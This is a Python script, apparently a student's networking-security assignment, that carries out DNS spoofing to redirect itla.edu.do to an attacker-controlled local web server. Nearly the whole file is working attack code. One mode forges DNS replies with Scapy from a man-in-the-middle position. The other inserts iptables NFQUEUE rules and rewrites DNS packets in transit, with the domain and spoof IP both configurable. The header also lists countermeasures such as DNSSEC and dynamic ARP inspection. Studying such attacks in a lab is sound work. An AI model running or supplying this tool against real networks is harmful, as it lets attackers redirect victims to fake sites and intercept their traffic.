#!/usr/bin/env python3
"""
=============================================================
  DNS Spoofing / DNS Poisoning Attack
  Target: itla.edu.do  →  Servicio Web Local
=============================================================
  Autor     : Ashley Fabian
  Matrícula : 2025-0773
  Asignatura: Networking - Seguridad en Redes
  Herramienta: Scapy + NetfilterQueue (Linux)
=============================================================
  DESCRIPCIÓN:
    Este script realiza DNS Spoofing interceptando consultas DNS
    en la red local. Cuando una víctima solicita la resolución
    de "itla.edu.do", el script responde con la IP del servidor
    web local atacante en lugar de la IP legítima.

    El ataque utiliza dos métodos seleccionables:
      1. PASSIVE  - Escucha y responde consultas DNS en la red
                    (requiere posición MitM previa, ej: ARP Spoofing).
      2. ACTIVE   - Usa NetfilterQueue (iptables) para interceptar
                    y modificar paquetes en tránsito en la misma máquina
                    o como router/gateway.

  OBJETIVO:
    Hacer que itla.edu.do resuelva a un servidor web local
    controlado por el atacante.

  REQUISITOS:
    - Python 3.x
    - Scapy            (pip install scapy)
    - NetfilterQueue   (pip install netfilterqueue)   [solo modo ACTIVE]
    - iptables disponible en el sistema               [solo modo ACTIVE]
    - Posición MitM (ARP Spoofing) para modo PASSIVE
    - Ejecutar como root / sudo

  USO:
    # Modo pasivo (escucha en la interfaz):
    sudo python3 AshleyFabian_2025-0773_dns_spoofing_P2.py -m passive -i eth0 -s 192.168.1.100

    # Modo activo (intercepta con iptables/NFQueue):
    sudo python3 AshleyFabian_2025-0773_dns_spoofing_P2.py -m active -s 192.168.1.100

  PARÁMETROS:
    -m / --mode      Modo: passive | active  (default: passive)
    -i / --iface     Interfaz de red         (requerido en modo passive)
    -s / --spoof-ip  IP local a la que redirigir itla.edu.do (requerido)
    -t / --target    Dominio objetivo        (default: itla.edu.do)
    -q / --queue     Número de NFQueue       (default: 0, solo modo active)
    -v / --verbose   Mostrar detalle de cada paquete interceptado

  CONTRA-MEDIDAS:
    1. Usar DNSSEC para validar respuestas DNS.
    2. Configurar DNS sobre HTTPS (DoH) o DNS sobre TLS (DoT).
    3. Usar servidores DNS confiables con validación (ej: 1.1.1.1, 8.8.8.8).
    4. Implementar ARP Inspection dinámica en switches.
    5. Monitorear tráfico DNS con IDS/IPS (Snort, Suricata).
=============================================================
"""

import argparse
import sys
import os
import signal
import subprocess
from datetime import datetime

try:
    from scapy.all import (
        IP, UDP, DNS, DNSQR, DNSRR,
        Ether, sniff, send, conf
    )
except ImportError:
    print("[ERROR] Scapy no está instalado.")
    print("        Instala con: pip install scapy")
    sys.exit(1)


# ── Globales ────────────────────────────────────────────────
spoofed_count = 0
TARGET_DOMAIN  = "itla.edu.do"
SPOOF_IP       = None
VERBOSE        = False
NFQ_HANDLE     = None


def banner():
    print("=" * 60)
    print("  DNS Spoofing Attack - itla.edu.do")
    print("  Autor: Ashley Fabian | Matrícula: 2025-0773")
    print(f"  Fecha/Hora: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 60)


# ════════════════════════════════════════════════════════════
#  MODO PASIVO — Scapy sniff + send
# ════════════════════════════════════════════════════════════

def dns_spoof_passive(packet):
    """
    Callback para Scapy sniff.
    Si el paquete es una consulta DNS para el dominio objetivo,
    forja y envía una respuesta con la IP del atacante.
    """
    global spoofed_count

    if not (packet.haslayer(DNS) and packet[DNS].qr == 0):
        return  # No es una consulta DNS

    queried = packet[DNS].qd.qname.decode().rstrip(".")
    if TARGET_DOMAIN not in queried:
        return  # No es el dominio objetivo

    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"[{timestamp}] Consulta detectada: {queried} desde {packet[IP].src}")

    # Construir respuesta DNS falsa
    spoofed = (
        IP(dst=packet[IP].src, src=packet[IP].dst) /
        UDP(dport=packet[UDP].sport, sport=53) /
        DNS(
            id=packet[DNS].id,
            qr=1,          # Respuesta
            aa=1,          # Authoritative
            qd=packet[DNS].qd,
            an=DNSRR(
                rrname=packet[DNS].qd.qname,
                ttl=300,
                rdata=SPOOF_IP
            )
        )
    )

    send(spoofed, verbose=False)
    spoofed_count += 1
    print(f"    [+] Respuesta falsa enviada: {queried} → {SPOOF_IP}  (total: {spoofed_count})")

    if VERBOSE:
        spoofed.show()


def run_passive(iface: str):
    banner()
    print(f"[*] Modo           : PASIVO (sniff)")
    print(f"[*] Interfaz       : {iface}")
    print(f"[*] Dominio target : {TARGET_DOMAIN}")
    print(f"[*] IP falsa       : {SPOOF_IP}")
    print(f"[*] Esperando consultas DNS... (Ctrl+C para detener)")
    print()

    try:
        sniff(
            iface=iface,
            filter="udp port 53",
            prn=dns_spoof_passive,
            store=False
        )
    except KeyboardInterrupt:
        print(f"\n[*] Detenido. Total de respuestas falsas enviadas: {spoofed_count}")


# ════════════════════════════════════════════════════════════
#  MODO ACTIVO — NetfilterQueue (iptables)
# ════════════════════════════════════════════════════════════

def setup_iptables(queue_num: int):
    """Agrega reglas iptables para redirigir DNS a NFQueue."""
    rules = [
        f"iptables -I FORWARD -p udp --dport 53 -j NFQUEUE --queue-num {queue_num}",
        f"iptables -I INPUT   -p udp --dport 53 -j NFQUEUE --queue-num {queue_num}",
    ]
    for rule in rules:
        subprocess.run(rule.split(), check=True)
        print(f"[*] iptables: {rule}")


def teardown_iptables(queue_num: int):
    """Elimina las reglas iptables al terminar."""
    rules = [
        f"iptables -D FORWARD -p udp --dport 53 -j NFQUEUE --queue-num {queue_num}",
        f"iptables -D INPUT   -p udp --dport 53 -j NFQUEUE --queue-num {queue_num}",
    ]
    for rule in rules:
        subprocess.run(rule.split(), capture_output=True)
    print("[*] Reglas iptables eliminadas.")


def nfq_callback(packet_nfq):
    """Callback de NetfilterQueue. Modifica o acepta cada paquete."""
    global spoofed_count

    try:
        from netfilterqueue import NetfilterQueue  # importación lazy
    except ImportError:
        pass  # ya validado antes

    raw = packet_nfq.get_payload()
    pkt = IP(raw)

    if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
        queried = pkt[DNS].qd.qname.decode().rstrip(".")
        if TARGET_DOMAIN in queried:
            timestamp = datetime.now().strftime("%H:%M:%S")
            print(f"[{timestamp}] NFQ capturó consulta: {queried}")

            # Modificar respuesta
            pkt[DNS].qr    = 1
            pkt[DNS].aa    = 1
            pkt[DNS].ancount = 1
            pkt[DNS].an    = DNSRR(
                rrname=pkt[DNS].qd.qname,
                ttl=300,
                rdata=SPOOF_IP
            )

            # Recalcular checksums
            del pkt[IP].len
            del pkt[IP].chksum
            del pkt[UDP].len
            del pkt[UDP].chksum

            packet_nfq.set_payload(bytes(pkt))
            spoofed_count += 1
            print(f"    [+] Paquete modificado: {queried} → {SPOOF_IP}  (total: {spoofed_count})")

            if VERBOSE:
                pkt.show()

    packet_nfq.accept()


def run_active(queue_num: int):
    try:
        from netfilterqueue import NetfilterQueue
    except ImportError:
        print("[ERROR] NetfilterQueue no está instalado.")
        print("        Instala con: pip install netfilterqueue")
        sys.exit(1)

    banner()
    print(f"[*] Modo           : ACTIVO (NetfilterQueue)")
    print(f"[*] NFQueue número : {queue_num}")
    print(f"[*] Dominio target : {TARGET_DOMAIN}")
    print(f"[*] IP falsa       : {SPOOF_IP}")
    print()

    setup_iptables(queue_num)
    print("[*] Esperando paquetes DNS... (Ctrl+C para detener)\n")

    nfqueue = NetfilterQueue()
    nfqueue.bind(queue_num, nfq_callback)

    def handle_exit(sig, frame):
        print(f"\n[*] Deteniendo... Total falseados: {spoofed_count}")
        nfqueue.unbind()
        teardown_iptables(queue_num)
        sys.exit(0)

    signal.signal(signal.SIGINT, handle_exit)

    try:
        nfqueue.run()
    except Exception as e:
        print(f"[ERROR] {e}")
        teardown_iptables(queue_num)
        sys.exit(1)


# ════════════════════════════════════════════════════════════
#  MAIN
# ════════════════════════════════════════════════════════════

def main():
    global SPOOF_IP, TARGET_DOMAIN, VERBOSE

    parser = argparse.ArgumentParser(
        description="DNS Spoofing - itla.edu.do | Ashley Fabian 2025-0773",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument(
        "-m", "--mode",
        choices=["passive", "active"],
        default="passive",
        help="Modo de ataque: passive o active (default: passive)"
    )
    parser.add_argument(
        "-i", "--iface",
        default=None,
        help="Interfaz de red (requerida en modo passive)"
    )
    parser.add_argument(
        "-s", "--spoof-ip",
        required=True,
        help="IP local a la que redirigir itla.edu.do"
    )
    parser.add_argument(
        "-t", "--target",
        default="itla.edu.do",
        help="Dominio a falsificar (default: itla.edu.do)"
    )
    parser.add_argument(
        "-q", "--queue",
        type=int,
        default=0,
        help="Número de NFQueue (default: 0, solo modo active)"
    )
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Mostrar detalle de cada paquete interceptado"
    )

    args = parser.parse_args()

    # Verificar root
    if os.geteuid() != 0:
        print("[ERROR] Este script debe ejecutarse como root (sudo).")
        sys.exit(1)

    SPOOF_IP      = args.spoof_ip
    TARGET_DOMAIN = args.target
    VERBOSE       = args.verbose

    if args.mode == "passive":
        if not args.iface:
            print("[ERROR] En modo passive debes especificar -i <interfaz>.")
            sys.exit(1)
        run_passive(args.iface)
    else:
        run_active(args.queue)


if __name__ == "__main__":
    main()
